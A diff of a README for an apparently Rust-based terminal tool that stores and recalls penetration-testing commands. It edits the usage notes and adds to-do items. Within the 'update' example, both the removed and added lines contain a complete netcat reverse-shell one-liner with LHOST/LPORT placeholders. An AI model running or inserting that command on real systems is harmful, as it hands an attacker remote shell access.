@@ -9,7 +9,7 @@ My current usage of this is to have it running in a tmux pane and when I need th
 - up/down arrow keys to highlight a command from the current search or from the history. Pressing return copies that command to the clipboard.  
 - 'info' displays full information on the currently selected command.  'full information' is very sparse at the moment.  
 - 'add -c <command>' to add a new command to the database.  optional: -d to add a comment/description with the command.
-- 'update <column> <content>' to update a database column of the currently selected command, which are 'command','comment' and 'author'.  The ID of the active command is display in the prompt. Examples: 'update comment spawn a pty via python3', 'update author greg scharf', 'update command rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [LHOST] [LPORT] >/tmp/f'.  
+- 'update <column> <content>' to update a database column of the currently selected command, which are 'command', 'comment' and 'author' at the moment. The ID of the active command is displayed in the command prompt. Examples: 'update comment spawn a pty via python3', 'update author greg scharf', 'update command rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [LHOST] [LPORT] >/tmp/f'.  
 
 ## Currently Working On
 - 'set' command for variable replacement when selecting a command that has placeholders for LHOST, LPORT, etc.
@@ -32,6 +32,8 @@ My current usage of this is to have it running in a tmux pane and when I need th
 - [ ] Update the database with newer commands for things like Bloodhound,ffuf,feroxbuster,Rubeus,Crackmapexec,Chisel,SSHuttle, etc.
 - [ ] Add a better method for generating help content with the prettytable crate.
 - [ ] Allow selection mode to wrap up or down
+- [ ] Fix errors that occur when attempting to create a statically linked linux release
+- [ ] Get Windows version working
 - [ ] Add search capability for text based/markdown notes.    
     - Root directory for user's notes will be supplied in a CLI variable.
 - [ ] Use pre-existing 'refs' table to link to markdown notes and display notes in terminal when selected... there is probably a crate to display markdown.
